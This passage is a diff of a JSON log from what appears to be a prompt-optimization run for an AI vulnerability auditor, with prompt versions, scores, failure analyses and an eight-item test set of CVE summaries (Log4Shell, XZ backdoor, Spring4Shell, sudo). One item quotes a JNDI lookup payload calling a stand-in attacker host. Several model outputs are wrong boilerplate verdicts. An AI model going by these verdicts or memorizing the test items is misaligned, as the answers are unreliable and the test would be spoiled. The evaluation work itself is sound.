+      "optimizer_reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "confidence_score": 48,
+      "confidence_level": "Low",
+      "classified_failures": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "reason": "Model over-aggressively flagged benign code/log as dangerous.",
+          "expected_status": "SAFE",
+          "predicted_status": "VULNERABLE"
+        }
+      ],
+      "root_causes": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "root_cause": "Prompt rules are too broad, causing benign queries or parameter bindings to be misflagged.",
+          "impact_level": "Medium"
+        }
+      ],
+      "generated_rules": [
+        {
+          "rule_id": "RULE_001",
+          "category": "Missing Safety Rule",
+          "rule_text": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns."
+        },
+        {
+          "rule_id": "RULE_002",
+          "category": "False Negative",
+          "rule_text": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns."
+        },
+        {
+          "rule_id": "RULE_003",
+          "category": "False Positive",
+          "rule_text": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns."
+        }
+      ],
+      "mutations_applied": [
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns.",
+          "rule": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns.",
+          "rule": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns.",
+          "rule": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH."
+        },
+        {
+          "operation": "REORDER_INSTRUCTIONS",
+          "reasoning": "Enforced multi-finding schema, distinct CWE/OWASP classification, and zero-hallucination RELATED CVE rules (RELATED CVE: None for generic code)."
+        }
+      ],
+      "explainability": {
+        "what_changed": "Applied 4 targeted mutation operations.",
+        "why_changed": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+        "failures_motivated": [
+          "Missing Safety Rule",
+          "False Negative",
+          "Missing Safety Rule"
+        ],
+        "confidence_score": 48,
+        "confidence_level": "Low"
+      }
+    },
+    {
+      "version": "v1.1",
+      "generation": 2,
+      "prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.\n\nCRITICAL SECURITY RULES & MULTI-FINDING AUDIT SCHEMA:\nREQUIRED MULTI-FINDING PROFESSIONAL AUDIT SCHEMA:\nAnalyze untrusted input sources, data flows, sensitive sinks, validation, encoding, and authentication.\nIf multiple vulnerabilities exist in the code/log (e.g. SQLi + Hardcoded Secret), report ALL of them as separate findings.\n\nCRITICAL CLASSIFICATION RULE FOR RELATED CVE:\n- Generic code snippets (e.g. const query = `SELECT * FROM users WHERE id='${id}'`) MUST map to CATEGORY, OWASP, and CWE only. Set RELATED CVE: None.\n- DO NOT invent or hallucinate a CVE for generic code.\n- Output a published CVE (e.g. CVE-2021-44228) ONLY if a specific vulnerable product, library version, or documented CVE exploit is explicitly identified.\n\nSTATUS: [SAFE | VULNERABLE]\nTOTAL FINDINGS: [Number of findings, e.g. 1, 2, 3]\n\n----------------------------------\nFinding #1\n\nCATEGORY: [Specific Vulnerability Name, e.g. SQL Injection, Cross-Site Scripting (XSS), Command Injection, Log4Shell]\nOWASP: [e.g. A03:2021 - Injection | A01:2021 - Broken Access Control | A10:2021 - SSRF]\nCWE: [e.g. CWE-89 | CWE-79 | CWE-78 | CWE-22 | CWE-918 | CWE-798]\nRELATED CVE: [None | CVE-XXXX-YYYY (ONLY if documented product CVE applies)]\nSEVERITY: [CRITICAL | HIGH | MEDIUM | LOW | NONE]\nCONFIDENCE: [HIGH | MEDIUM | LOW]\n\nAFFECTED CODE:\n[Highlight exact vulnerable code line(s)]\n\nREASONING:\n[Detailed data flow analysis explaining source, sink, and why validation is missing]\n\nIMPACT:\n- Bulleted list of security impacts (e.g. Database exfiltration, Remote Code Execution)\n\nRECOMMENDATION:\n[Actionable remediation steps]\n\nSECURE CODE:\n[Drop-in fixed code snippet demonstrating parameterized queries or secure controls]\n----------------------------------\n\nADDITIONAL DOMAIN RULES:\n+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.\n+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.\n+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+      "accuracy": 37.5,
+      "precision": 66.67,
+      "recall": 33.33,
+      "f1": 44.44,
+      "passed": 3,
+      "total": 8,
+      "failures_count": 5,
+      "failures": [
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "SUPPLY CHAIN BACKDOOR / AUTHENTICATION BYPASS",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "KERNEL MEMORY CORRUPTION / PRIVILEGE ESCALATION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "HEAP BUFFER OVERFLOW / MEMORY CORRUPTION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "LOCAL PRIVILEGE ESCALATION (LPE)",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected_status": "SAFE",
+          "expected_category": "PATCHED SECURITY RELEASE",
+          "predicted_status": "VULNERABLE",
+          "predicted_category": "Log4Shell Remote Code Execution",
+          "predicted_cwe": "CWE-502",
+          "predicted_owasp": "A08:2021 - Software and Data Integrity Failures",
+          "predicted_cve": "CVE-2021-44228",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        }
+      ],
+      "detailed_results": [
+        {
+          "id": "CVE-2021-44228",
+          "input": "Official cve.org Record (CVE-2021-44228 - Log4Shell):\nApache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled: '${jndi:ldap://attacker.com/a}'.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2022-22965",
+          "input": "Official cve.org Record (CVE-2022-22965 - Spring4Shell):\nA Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to Remote Code Execution (RCE) via data binding. An HTTP request parameter binding to 'class.module.classLoader.resources.context.parent.pipeline.first.pattern' allows unauthenticated attackers to write arbitrary JSP webshell files to the web root.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Spring4Shell Remote Code Execution",
+              "owasp": "A06:2021 - Vulnerable and Outdated Components",
+              "cwe": "CWE-94",
+              "related_cve": "CVE-2022-22965",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "class.module.classLoader.resources.context.parent.pipeline.first...",
+              "reasoning": "Spring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+.",
+              "secure_code": "// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Spring4Shell Remote Code Execution\nOWASP: A06:2021 - Vulnerable and Outdated Components\nCWE: CWE-94\nRELATED CVE: CVE-2022-22965\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nclass.module.classLoader.resources.context.parent.pipeline.first...\n\nREASONING:\nSpring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.\n\nIMPACT:\n- Remote Code Execution (RCE)\n\nRECOMMENDATION:\nUpgrade Spring Framework to 5.3.18+ or 5.2.20+.\n\nSECURE CODE:\n// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2023-38606-FIX",
+          "input": "Official cve.org Patch Verification (Apple macOS 12.6.8 / iOS 15.7.8):\nState management validation logic updated in Apple Kernel. Unmapped MMIO register ranges are strictly checked against physical memory range bounds, and PPL page table permissions are locked against dynamic modification.",
+          "expected": "SAFE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        }
+      ],
+      "estimated_tokens": 6973,
+      "optimizer_reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "confidence_score": 48,
+      "confidence_level": "Low",
+      "classified_failures": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
